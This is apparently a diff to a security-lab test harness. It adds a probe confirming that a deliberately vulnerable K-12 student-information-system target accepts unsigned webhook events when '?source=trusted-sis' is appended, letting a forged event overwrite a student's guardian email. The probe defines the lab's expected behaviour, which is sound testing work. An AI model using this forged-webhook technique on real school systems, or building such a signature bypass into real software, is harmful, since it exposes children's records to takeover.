@@ -305,6 +305,78 @@ async function probeLtiSharedSecretLeak() {
   return ["target: k12-lti-shared-secret-leak", "forged_lti_instructor_launch: confirmed"]
 }
 
+async function probeSisWebhookSignatureBypass() {
+  const { proc, base } = await startTarget("k12-sis-webhook-signature-bypass")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-sis-webhook-signature-bypass") fail(proc, "health probe failed")
+
+  const policy = await fetch(`${base}/api/webhooks/sis/policy`).then((res) => res.json()) as {
+    signatureMode?: string
+    trustedSourceBypass?: string
+    labFinding?: string
+  }
+  if (
+    policy.signatureMode !== "warn" ||
+    policy.trustedSourceBypass !== "source=trusted-sis" ||
+    policy.labFinding !== "sis_webhook_signature_not_enforced"
+  ) {
+    fail(proc, "SIS webhook policy probe did not confirm weak signature enforcement")
+  }
+
+  const rejected = await fetch(`${base}/api/webhooks/sis/events`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      type: "student.guardian.updated",
+      studentId: "student-5109",
+      guardianEmail: "attacker-guardian@example.test",
+    }),
+  }).then((res) => res.json()) as { accepted?: boolean; error?: string }
+  if (rejected.accepted || rejected.error !== "invalid_signature") {
+    fail(proc, "SIS webhook baseline signature rejection probe failed")
+  }
+
+  const accepted = await fetch(`${base}/api/webhooks/sis/events?source=trusted-sis`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      type: "student.guardian.updated",
+      studentId: "student-5109",
+      guardianEmail: "attacker-guardian@example.test",
+    }),
+  }).then((res) => res.json()) as {
+    accepted?: boolean
+    signatureVerified?: boolean
+    guardianEmail?: string
+    labFinding?: string
+  }
+  if (
+    !accepted.accepted ||
+    accepted.signatureVerified ||
+    accepted.guardianEmail !== "attacker-guardian@example.test" ||
+    accepted.labFinding !== "sis_webhook_signature_bypass"
+  ) {
+    fail(proc, "SIS webhook replay probe did not confirm unsigned event bypass")
+  }
+
+  const guardian = await fetch(`${base}/api/students/student-5109/guardian`).then((res) => res.json()) as {
+    guardianEmail?: string
+    verifiedBySchool?: boolean
+    labFinding?: string
+  }
+  if (
+    guardian.guardianEmail !== "attacker-guardian@example.test" ||
+    guardian.verifiedBySchool ||
+    guardian.labFinding !== "guardian_contact_modified_by_unsigned_webhook"
+  ) {
+    fail(proc, "SIS guardian record probe did not confirm unsigned webhook state change")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-sis-webhook-signature-bypass", "sis_webhook_signature_bypass: confirmed"]
+}
+
 const lines = [
   "ulm_lab_target: ok",
   ...(await probeMfaGap()),
@@ -315,6 +387,7 @@ const lines = [
   ...(await probePasswordResetTokenLeak()),
   ...(await probeGuardianInviteTakeover()),
   ...(await probeLtiSharedSecretLeak()),
+  ...(await probeSisWebhookSignatureBypass()),
 ]
 
 console.log(lines.join("\n"))
